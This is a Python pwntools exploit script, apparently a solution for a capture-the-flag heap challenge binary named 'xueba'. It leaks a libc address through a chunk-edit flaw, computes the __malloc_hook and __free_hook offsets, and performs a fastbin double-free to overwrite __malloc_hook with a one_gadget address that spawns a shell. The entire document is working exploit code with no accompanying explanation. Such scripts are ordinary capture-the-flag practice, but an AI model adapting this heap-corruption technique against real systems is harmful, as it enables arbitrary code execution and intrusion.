#!/usr/bin/env python
from pwn import *
context(arch='i386',log_level='debug')
p=process('./xueba')#,env={'LD_PRELOAD':'./libc-2.23.so'})

ru=lambda s:p.recvuntil(s)
sl=lambda s:p.sendline(s)
sd=lambda s:p.send(s)


def new(size,name,content,sline=1):
    ru('5.Exit\n')
    sl('1')
    ru('?\n')
    sl(str(size))
    ru(':\n')
    sd(name)
    if sline:
        sl(content)
    else:
        sd(content)

def show(index):
    ru('t\n')
    sl('2')
    ru(':\n')
    sl(str(index))

def delete(index):
    ru('t\n')
    sl('3')
    ru(':\n')
    sl(str(index))

def edit(index,char1,char2):
    ru('t\n')
    sl('4')
    ru(':\n')
    sl(str(index))
    ru('?\n')
    sd(char1)
    sleep(0.1)
    sd(char2)


name_payload=('a'*0x10+'\x01').ljust(0x15,'\x00')

new(0x60,name_payload,'a')             # 
new(0x20,name_payload,'a')             # 1
new(0x60,name_payload,'a')            
new(0x20,name_payload,'a')             
delete(0)
delete(2)
new(0x400,name_payload,'a')            # 0


edit(2,'\x00','\x01')
show(2)

ru('tent:')

libc=u64((ru('1.Add')[0:6]).ljust(8,'\x00'))
libc_base=libc-0x3c4bd8
malloc_hook=libc_base+0x3c4b10
free_hook=libc_base+0x3c67a8

one_off=0x45216
# one_off=0x4526a
one_off=0xf02a4
# one_off=0xf1147
one=libc_base+one_off
delete(3)

new(0x60,name_payload,'a')             
new(0x60,name_payload,'a')             
delete(2)
delete(4)
delete(3)
target=malloc_hook-0x23
free_target=free_hook-0x13

gdb.attach(p)
# add=p64(libc_base+0x85e20)+p64(libc_base+0x85a00)
add=p64(one)+p64(one)
new(0x60,name_payload,p64(target))      # 2             over with 4
new(0x60,name_payload,p64(target))      # 3
new(0x60,name_payload,'a')              # 4


new(0x60,name_payload,'\x00'*0x3+add+p64(one))
print(hex(libc_base),hex(one))
print(hex(free_hook))


p.interactive()